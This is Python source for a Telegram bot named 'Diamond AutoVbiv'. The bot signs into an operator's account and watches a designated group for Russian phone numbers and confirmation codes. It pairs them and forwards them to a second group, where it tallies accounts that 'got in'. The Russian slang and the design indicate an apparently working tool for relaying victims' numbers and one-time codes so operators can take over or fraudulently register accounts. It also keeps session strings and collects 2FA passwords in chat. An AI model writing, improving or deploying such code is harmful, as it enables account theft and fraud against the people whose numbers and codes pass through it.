# diamond_autovbiv.py
# FULL FIXED - РАБОТАЕТ С ЛЮБЫМИ РОССИЙСКИМИ НОМЕРАМИ

import os
import asyncio
import re
import sqlite3
import shutil
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
from telethon.tl.custom import Button

# ========== КОНФИГ ДЛЯ RAILWAY ==========
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

SESSION_DIR = os.environ.get("SESSION_DIR", "/app/sessions")
os.makedirs(SESSION_DIR, exist_ok=True)

DB_PATH = "/app/diamond_data.db"
BACKUP_DIR = "/app/backups"
os.makedirs(BACKUP_DIR, exist_ok=True)

if not API_ID or not API_HASH or not BOT_TOKEN:
    print("❌ Ошибка: Установите переменные в Railway")
    print("API_ID, API_HASH, BOT_TOKEN")
    exit(1)

# ========== БАЗА ДАННЫХ ==========
class DiamondDB:
    def __init__(self):
        self.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                user_id INTEGER PRIMARY KEY,
                phone TEXT,
                session_string TEXT,
                step TEXT,
                created_at TIMESTAMP
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS groups (
                user_id INTEGER PRIMARY KEY,
                source_group INTEGER,
                target_group INTEGER
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS pending (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                phone TEXT,
                code TEXT,
                status TEXT,
                created_at TIMESTAMP
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                phone TEXT,
                action TEXT,
                timestamp TIMESTAMP
            )
        ''')
        self.conn.commit()
    
    def save_session(self, user_id, phone, session_string, step):
        self.cursor.execute('''
            INSERT OR REPLACE INTO sessions (user_id, phone, session_string, step, created_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, phone, session_string, step, datetime.now()))
        self.conn.commit()
    
    def get_session(self, user_id):
        self.cursor.execute('SELECT session_string, phone, step FROM sessions WHERE user_id = ?', (user_id,))
        row = self.cursor.fetchone()
        return row if row else (None, None, None)
    
    def is_authorized(self, user_id):
        session_string, _, step = self.get_session(user_id)
        return session_string is not None and session_string != "" and step == "authorized"
    
    def set_groups(self, user_id, source_group, target_group):
        self.cursor.execute('''
            INSERT OR REPLACE INTO groups (user_id, source_group, target_group)
            VALUES (?, ?, ?)
        ''', (user_id, source_group, target_group))
        self.conn.commit()
    
    def get_groups(self, user_id):
        self.cursor.execute('SELECT source_group, target_group FROM groups WHERE user_id = ?', (user_id,))
        row = self.cursor.fetchone()
        return row if row else (None, None)
    
    def add_pending_number(self, user_id, phone):
        self.cursor.execute('''
            INSERT INTO pending (user_id, phone, status, created_at)
            VALUES (?, ?, 'waiting_code', ?)
        ''', (user_id, phone, datetime.now()))
        self.conn.commit()
    
    def update_pending_with_code(self, phone, code):
        self.cursor.execute('''
            UPDATE pending SET code = ?, status = 'code_received'
            WHERE phone = ? AND status = 'waiting_code'
        ''', (code, phone))
        self.conn.commit()
    
    def mark_success(self, phone):
        self.cursor.execute('''
            UPDATE pending SET status = 'success' WHERE phone = ? AND status = 'code_received'
        ''', (phone,))
        self.conn.commit()
    
    def add_stat(self, user_id, phone, action):
        self.cursor.execute('''
            INSERT INTO stats (user_id, phone, action, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (user_id, phone, action, datetime.now()))
        self.conn.commit()
    
    def get_stats_today(self, user_id):
        today = datetime.now().replace(hour=0, minute=0, second=0)
        self.cursor.execute('''
            SELECT action, COUNT(*) FROM stats 
            WHERE user_id = ? AND timestamp >= ?
            GROUP BY action
        ''', (user_id, today))
        return dict(self.cursor.fetchall())
    
    def get_last_pending_number(self, user_id):
        self.cursor.execute('''
            SELECT phone FROM pending 
            WHERE user_id = ? AND status = 'waiting_code' 
            ORDER BY created_at DESC LIMIT 1
        ''', (user_id,))
        row = self.cursor.fetchone()
        return row[0] if row else None
    
    def export_db(self, user_id):
        backup_path = os.path.join(BACKUP_DIR, f"diamond_backup_user_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db")
        shutil.copy2(DB_PATH, backup_path)
        return backup_path
    
    def import_db(self, file_path):
        shutil.copy2(file_path, DB_PATH)
        self.conn.close()
        self.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        self.cursor = self.conn.cursor()
        return True

db = DiamondDB()

# ========== ОСНОВНОЙ БОТ ==========
bot = None
user_clients = {}
user_code_inputs = {}

# ========== КЛАВИАТУРА ДЛЯ ВВОДА КОДА ==========
def get_code_keyboard():
    return [
        [Button.inline("1", b"1"), Button.inline("2", b"2"), Button.inline("3", b"3")],
        [Button.inline("4", b"4"), Button.inline("5", b"5"), Button.inline("6", b"6")],
        [Button.inline("7", b"7"), Button.inline("8", b"8"), Button.inline("9", b"9")],
        [Button.inline("0", b"0"), Button.inline("⌫", b"del"), Button.inline("✅ ПОДТВЕРДИТЬ", b"submit")]
    ]

# ========== ФУНКЦИИ ДЛЯ РАБОТЫ С НОМЕРАМИ (ЛЮБЫЕ РУССКИЕ) ==========
def clean_phone(phone):
    """Очищает и приводит номер к формату +7XXXXXXXXXX"""
    cleaned = re.sub(r'[^\d+]', '', phone)
    cleaned = re.sub(r'^\+{2,}', '+', cleaned)
    
    if cleaned.startswith('8'):
        cleaned = '+7' + cleaned[1:]
    elif cleaned.startswith('7') and not cleaned.startswith('+'):
        cleaned = '+' + cleaned
    elif cleaned.startswith('9'):
        cleaned = '+7' + cleaned
    elif not cleaned.startswith('+') and cleaned.isdigit():
        cleaned = '+' + cleaned
    elif not cleaned.startswith('+'):
        cleaned = '+' + cleaned
    
    # Оставляем 11 цифр после + (максимум)
    if cleaned.startswith('+') and len(cleaned) > 12:
        cleaned = '+' + cleaned[1:12]
    
    return cleaned

def extract_phone_from_text(text):
    """Извлекает ЛЮБОЙ российский номер телефона из текста"""
    patterns = [
        r'\+?7\d{10}',           # +71234567890
        r'8\d{10}',               # 81234567890
        r'\+?79\d{9}',            # +79001234567
        r'[78]\d{10}',            # 71234567890 или 81234567890
        r'\d{11}',                # любые 11 цифр
        r'\d{10}',                # любые 10 цифр
        r'\+?\d{1,3}[-.\s]?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{2}[-.\s]?\d{2}',  # с разделителями
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            cleaned = clean_phone(match)
            if cleaned.startswith('+') and len(cleaned) == 12 and cleaned[1:].isdigit():
                return cleaned
            if cleaned.startswith('+') and len(cleaned) == 11 and cleaned[1:].isdigit():
                return cleaned
            if len(cleaned) == 11 and cleaned.isdigit():
                return '+' + cleaned
    return None

def extract_code_from_text(text):
    """Извлекает код подтверждения (4-8 цифр)"""
    match = re.search(r'\b(\d{4,8})\b', text)
    return match.group(1) if match else None

# ========== ФУНКЦИИ ДЛЯ РАБОТЫ С КЛИЕНТАМИ ==========
async def get_user_client(user_id, session_string=None):
    if user_id in user_clients:
        client = user_clients[user_id]
        if client.is_connected():
            return client
    
    if not session_string:
        session_string, _, _ = db.get_session(user_id)
        if not session_string:
            return None
    
    session_path = os.path.join(SESSION_DIR, f"user_{user_id}")
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    
    if session_string:
        client.session.set_session_str(session_string)
        if await client.is_user_authorized():
            user_clients[user_id] = client
            return client
    return None

# ========== ОБРАБОТЧИКИ КОМАНД ==========
async def setup_handlers():
    global bot
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_cmd(event):
        await event.reply("""
💎 **DIAMOND AUTOVBIV BOT** 💎

/login +79991234567 — вход в аккаунт
/set_source — в **ЭТОЙ** группе (источник номеров и кодов)
/set_target — в **ЭТОЙ** группе (куда сливать и где "встал")
/stats — статистика
/status — статус
/export — выгрузить БД
/import — импорт БД (отправить файл)
/reset — сбросить всё
        """)
    
    @bot.on(events.NewMessage(pattern='/login (.+)'))
    async def login_cmd(event):
        user_id = event.sender_id
        phone = clean_phone(event.pattern_match.group(1).strip())
        
        await event.reply(f"📱 Отправляю код на {phone}...")
        
        session_path = os.path.join(SESSION_DIR, f"temp_{user_id}")
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        
        try:
            await client.send_code_request(phone)
            user_clients[user_id] = client
            db.save_session(user_id, phone, "", "waiting_code")
            user_code_inputs[user_id] = {'code': '', 'phone': phone, 'attempts': 0}
            
            await event.reply(
                f"✅ Код отправлен на {phone}\n\n🔢 **Введите код через кнопки:**\n\nКод: ` `",
                buttons=get_code_keyboard()
            )
        except FloodWaitError as e:
            await event.reply(f"❌ Подождите {e.seconds} секунд")
        except Exception as e:
            await event.reply(f"❌ Ошибка: {str(e)}")
    
    @bot.on(events.NewMessage(pattern='/2fa (.+)'))
    async def twofa_cmd(event):
        user_id = event.sender_id
        password = event.pattern_match.group(1).strip()
        _, _, step = db.get_session(user_id)
        client = user_clients.get(user_id)
        
        if not client or step != "waiting_2fa":
            await event.reply("❌ Сначала используйте /login")
            return
        
        try:
            await client.sign_in(password=password)
            session_string = client.session.save()
            phone = (await client.get_me()).phone
            db.save_session(user_id, phone, session_string, "authorized")
            await event.reply(f"✅ **Вход выполнен!**\nАккаунт: {phone}")
        except Exception as e:
            await event.reply(f"❌ Ошибка: {str(e)}")
    
    @bot.on(events.CallbackQuery())
    async def callback_handler(event):
        user_id = event.sender_id
        data = event.data.decode('utf-8')
        
        if user_id not in user_code_inputs:
            await event.answer("❌ Сначала используйте /login", alert=True)
            return
        
        current_code = user_code_inputs[user_id]['code']
        phone = user_code_inputs[user_id]['phone']
        
        if data.isdigit():
            user_code_inputs[user_id]['code'] += data
            new_code = user_code_inputs[user_id]['code']
            await event.answer(f"Код: {new_code}")
            await event.edit(
                f"✅ Код отправлен на {phone}\n\n🔢 **Код:** `{new_code}`",
                buttons=get_code_keyboard()
            )
        
        elif data == 'del':
            user_code_inputs[user_id]['code'] = current_code[:-1]
            new_code = user_code_inputs[user_id]['code']
            await event.answer("Удалено")
            await event.edit(
                f"✅ Код отправлен на {phone}\n\n🔢 **Код:** `{new_code}`",
                buttons=get_code_keyboard()
            )
        
        elif data == 'submit':
            code = user_code_inputs[user_id]['code']
            if not code:
                await event.answer("❌ Введите код!", alert=True)
                return
            
            await event.answer(f"⏳ Проверяю код {code}...")
            client = user_clients.get(user_id)
            
            try:
                await client.sign_in(code=code)
                session_string = client.session.save()
                user_phone = (await client.get_me()).phone
                db.save_session(user_id, user_phone, session_string, "authorized")
                await event.edit(f"✅ **Вход выполнен!**\nАккаунт: {user_phone}\n\nТеперь настройте группы:\n/set_source — в группе с номерами и кодами\n/set_target — в группе для слива")
                del user_code_inputs[user_id]
            except PhoneCodeInvalidError:
                user_code_inputs[user_id]['attempts'] += 1
                if user_code_inputs[user_id]['attempts'] >= 3:
                    await event.edit(f"❌ 3 неверных попытки. Используйте /login заново")
                    del user_code_inputs[user_id]
                else:
                    user_code_inputs[user_id]['code'] = ''
                    await event.edit(f"❌ Неверный код! Попробуйте ещё раз (попытка {user_code_inputs[user_id]['attempts']}/3)\n\nКод: ` `", buttons=get_code_keyboard())
            except SessionPasswordNeededError:
                db.save_session(user_id, phone, "", "waiting_2fa")
                await event.edit(f"🔐 Требуется двухфакторная аутентификация: /2fa <пароль>")
                del user_code_inputs[user_id]
            except Exception as e:
                await event.edit(f"❌ Ошибка: {str(e)}")
                del user_code_inputs[user_id]
    
    # ========== НАСТРОЙКА ГРУПП (РАБОТАЕТ В ГРУППАХ) ==========
    @bot.on(events.NewMessage(pattern='(?i)/set_source'))
    async def set_source_cmd(event):
        user_id = event.sender_id
        if event.is_group:
            source_group = event.chat_id
            _, target_group = db.get_groups(user_id)
            db.set_groups(user_id, source_group, target_group)
            await event.reply(f"✅ **ГРУППА ИСТОЧНИК установлена!**\n\nСюда буду смотреть номера и коды.")
            
            print(f"[SET_SOURCE] Пользователь {user_id} установил источник {source_group}")
            
            # Запускаем слушатель если есть сессия
            if db.is_authorized(user_id):
                session_string, _, _ = db.get_session(user_id)
                if session_string:
                    client = await get_user_client(user_id, session_string)
                    if client:
                        asyncio.create_task(start_source_listener(user_id, client, source_group))
        else:
            await event.reply("❌ Эту команду нужно писать В ГРУППЕ, которую хотите сделать источником!")
    
    @bot.on(events.NewMessage(pattern='(?i)/set_target'))
    async def set_target_cmd(event):
        user_id = event.sender_id
        if event.is_group:
            target_group = event.chat_id
            source_group, _ = db.get_groups(user_id)
            db.set_groups(user_id, source_group, target_group)
            await event.reply(f"✅ **ГРУППА ЦЕЛЬ установлена!**\n\nСюда буду отправлять номера и коды, здесь жду 'встал'.")
            
            print(f"[SET_TARGET] Пользователь {user_id} установил цель {target_group}")
            
            # Запускаем слушатель для источника если есть
            if source_group and db.is_authorized(user_id):
                session_string, _, _ = db.get_session(user_id)
                if session_string:
                    client = await get_user_client(user_id, session_string)
                    if client:
                        asyncio.create_task(start_source_listener(user_id, client, source_group))
        else:
            await event.reply("❌ Эту команду нужно писать В ГРУППЕ, которую хотите сделать целью!")
    
    @bot.on(events.NewMessage(pattern='/stats'))
    async def stats_cmd(event):
        user_id = event.sender_id
        stats = db.get_stats_today(user_id)
        msg = f"📊 **СТАТИСТИКА ЗА СЕГОДНЯ**\n\n"
        msg += f"📱 Номеров получено: {stats.get('number_taken', 0)}\n"
        msg += f"🔢 Кодов получено: {stats.get('code_taken', 0)}\n"
        msg += f"✅ Аккаунтов встало: {stats.get('success', 0)}"
        await event.reply(msg)
    
    @bot.on(events.NewMessage(pattern='/status'))
    async def status_cmd(event):
        user_id = event.sender_id
        _, phone, step = db.get_session(user_id)
        source, target = db.get_groups(user_id)
        
        authorized = step == "authorized"
        
        msg = f"⚙️ **СТАТУС БОТА**\n\n"
        msg += f"👤 Аккаунт: {phone or '❌ не авторизован'}\n"
        msg += f"🔐 Статус: {'✅ авторизован' if authorized else '❌ не авторизован'}\n"
        msg += f"📥 Группа-источник: {source or '❌ не установлена'}\n"
        msg += f"📤 Группа-цель: {target or '❌ не установлена'}"
        await event.reply(msg)
    
    @bot.on(events.NewMessage(pattern='/export'))
    async def export_cmd(event):
        user_id = event.sender_id
        
        if not db.is_authorized(user_id):
            await event.reply("❌ Сначала выполните вход: /login +79991234567")
            return
        
        backup_path = db.export_db(user_id)
        await event.reply("📦 **Выгрузка базы данных...**")
        await bot.send_file(event.chat_id, backup_path, caption="💎 diamond_data.db — файл базы данных Diamond AutoVbiv")
        print(f"[EXPORT] Пользователь {user_id} выгрузил БД")
    
    @bot.on(events.NewMessage(pattern='/import'))
    async def import_cmd(event):
        user_id = event.sender_id
        
        if not db.is_authorized(user_id):
            await event.reply("❌ Сначала выполните вход: /login +79991234567")
            return
        
        await event.reply("📥 **Отправьте файл .db для импорта**")
        print(f"[IMPORT] Пользователь {user_id} запросил импорт")
        
        @bot.on(events.NewMessage(func=lambda e: e.file and e.file.name and e.file.name.endswith('.db')))
        async def handle_import(msg):
            if msg.sender_id != user_id:
                return
            file_path = os.path.join(BACKUP_DIR, f"import_{user_id}.db")
            await msg.download_media(file_path)
            db.import_db(file_path)
            await msg.reply("✅ **База данных восстановлена!** Бот перезагружается...")
            print(f"[IMPORT] Пользователь {user_id} импортировал БД")
            asyncio.create_task(restart_bot())
    
    @bot.on(events.NewMessage(pattern='/reset'))
    async def reset_cmd(event):
        user_id = event.sender_id
        if user_id in user_clients:
            await user_clients[user_id].disconnect()
            del user_clients[user_id]
        if user_id in user_code_inputs:
            del user_code_inputs[user_id]
        db.cursor.execute('DELETE FROM sessions WHERE user_id = ?', (user_id,))
        db.cursor.execute('DELETE FROM groups WHERE user_id = ?', (user_id,))
        db.conn.commit()
        await event.reply("✅ **Все данные сброшены!**\n\nИспользуйте /login для входа в аккаунт")
        print(f"[RESET] Пользователь {user_id} сбросил все данные")
    
    # ========== ОСНОВНАЯ ЛОГИКА ПЕРЕХВАТА ==========
    async def start_source_listener(user_id, client, source_group_id):
        """Слушаем группу-источник на номера и коды"""
        print(f"[LISTENER] Запущен слушатель для пользователя {user_id} в группе {source_group_id}")
        
        @client.on(events.NewMessage(chats=source_group_id))
        async def handle_source(event):
            try:
                if event.sender_id == (await client.get_me()).id:
                    return
                
                text = event.raw_text.strip()
                print(f"[SOURCE] Новое сообщение: {text[:100]}")
                
                # 1. Ищем НОМЕР (любой российский)
                phone = extract_phone_from_text(text)
                if phone:
                    print(f"[SOURCE] Найден номер: {phone}")
                    db.add_pending_number(user_id, phone)
                    db.add_stat(user_id, phone, 'number_taken')
                    _, target_group = db.get_groups(user_id)
                    if target_group:
                        await client.send_message(target_group, f"📱 **НОМЕР:** `{phone}`")
                        print(f"[SOURCE] Номер {phone} отправлен в целевую группу")
                    return
                
                # 2. Ищем КОД (4-8 цифр)
                code = extract_code_from_text(text)
                if code:
                    print(f"[SOURCE] Найден код: {code}")
                    last_phone = db.get_last_pending_number(user_id)
                    if last_phone:
                        db.update_pending_with_code(last_phone, code)
                        db.add_stat(user_id, last_phone, 'code_taken')
                        _, target_group = db.get_groups(user_id)
                        if target_group:
                            await client.send_message(target_group, f"🔢 **КОД:** `{code}`\n📱 Для номера: `{last_phone}`")
                            print(f"[SOURCE] Код {code} для номера {last_phone} отправлен в целевую группу")
                    else:
                        print(f"[SOURCE] Нет ожидающего номера для кода {code}")
                        
            except Exception as e:
                print(f"[SOURCE ERROR] {e}")
    
    # Слушаем сообщения "встал" в целевой группе
    @bot.on(events.NewMessage())
    async def handle_target(event):
        try:
            user_id = event.sender_id
            _, target_group = db.get_groups(user_id)
            
            if not target_group or event.chat_id != target_group:
                return
            
            text = event.raw_text.lower()
            print(f"[TARGET] Сообщение в целевой группе: {text[:100]}")
            
            if 'встал' in text or 'успех' in text or 'success' in text or 'готов' in text:
                phone = extract_phone_from_text(text)
                if phone:
                    print(f"[TARGET] Успех для номера {phone}")
                    db.mark_success(phone)
                    db.add_stat(user_id, phone, 'success')
                    await event.reply(f"✅ **{phone} — ВСТАЛ!**\n💎 Аккаунт успешно автовбит!")
                else:
                    # Если номер не найден в сообщении с "встал", берём последний
                    last_phone = db.get_last_pending_number(user_id)
                    if last_phone:
                        db.mark_success(last_phone)
                        db.add_stat(user_id, last_phone, 'success')
                        await event.reply(f"✅ **{last_phone} — ВСТАЛ!**\n💎 Аккаунт успешно автовбит!")
        except Exception as e:
            print(f"[TARGET ERROR] {e}")

async def restart_bot():
    """Перезапуск бота после импорта БД"""
    await asyncio.sleep(2)
    os._exit(0)

# ========== ЗАПУСК ==========
async def main():
    global bot
    print("💎 DIAMOND AUTOVBIV BOT v3.0")
    print(f"📡 API_ID: {API_ID}")
    print(f"📁 Директория сессий: {SESSION_DIR}")
    print(f"📁 Директория БД: {DB_PATH}")
    
    bot = TelegramClient(os.path.join(SESSION_DIR, "main_bot"), API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    
    await setup_handlers()
    print("✅ Бот успешно запущен!")
    print("📌 Команды для настройки:")
    print("   • /set_source — в группе с номерами и кодами")
    print("   • /set_target — в группе для слива и 'встал'")
    print("   • /status — проверить статус")
    
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
